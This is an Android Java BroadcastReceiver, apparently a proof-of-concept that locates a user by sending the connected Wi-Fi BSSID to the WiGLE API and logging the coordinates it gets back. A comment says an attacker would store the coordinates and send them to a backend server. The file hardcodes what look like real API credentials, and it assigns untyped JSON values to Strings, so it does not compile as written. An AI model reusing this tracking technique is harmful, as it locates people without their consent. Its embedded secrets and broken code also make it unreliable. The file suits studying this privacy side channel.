package com.example.chirantar.meinefirstapp;

import android.content.BroadcastReceiver;
import android.net.wifi.WifiInfo;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.content.*;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.lang.*;
import java.util.Objects;

import okhttp3.Authenticator;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Credentials;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.Route;
import okhttp3.internal.http.HttpHeaders;

public class broadcast extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent) {
        // Get BSSID and SSD from broadcast data
        WifiInfo wifiInfo;
        try {
            wifiInfo = (WifiInfo) intent.getExtras().get("wifiInfo");
            if (wifiInfo == null) {
                Log.i("wifiInfo", "wifiInfo object is null. Wifi is probably disconnected.");
                return;
            }
        } catch (NullPointerException e) {
            return;
        }

        // Extract SSID and BSSID from WifiInfo object
        String ssid = wifiInfo.getSSID();
        String bssid = wifiInfo.getBSSID();
        if (bssid == null) {
            Log.i("wifiInfo", "No BSSID returend. Wifi is probably disconnected.");
            return;
        }

        Log.i("wifiInfo", "Logged following network: SSID " + ssid + " BSSID: " + bssid);

        // Get location via WiGLE HTTP API based on BSSID
        String requestUrl = "https://api.wigle.net/api/v2/network/search?netid=" + bssid;
        String credentials = Credentials.basic("AID859fc1cc1c84f92ee9a0bfe4795f7a68", "fbc55ad2382344a16955513ab65d249f");
        Request httpRequest = new Request.Builder()
                .url(requestUrl)
                .header("Authorization", credentials)
                .build();

        OkHttpClient httpClient = new OkHttpClient();

        httpClient.newCall(httpRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // Something went wrong
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    return;
                }
                String jsonData = response.body().string();
                JSONObject json = null;
                try {
                    // Check whether the wiggle API returned any error message
                    json = new JSONObject(jsonData);
                    if (json.get("success").equals(false)) {
                        Log.e("wifiInfo", "WiGLE API returned an Error: " + jsonData);
                        return;
                    }
                    // Parse the results of the WiGLE API
                    JSONArray results = json.getJSONArray("results");
                    JSONObject resultDetails = (JSONObject) results.get(0);
                    
                    // The resolved coordinates of the access points location
                    String lat = resultDetails.get("trilat");
                    String lng = resultDetails.get("trilong");
                    // A wise attacker would now store this in a local DB and send it from time to time to a backend server.
                    // But we're just logging it for demonstration purposes
                    Log.i("wifiInfo", "Lat: " + lat + " Lon: " + lng);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}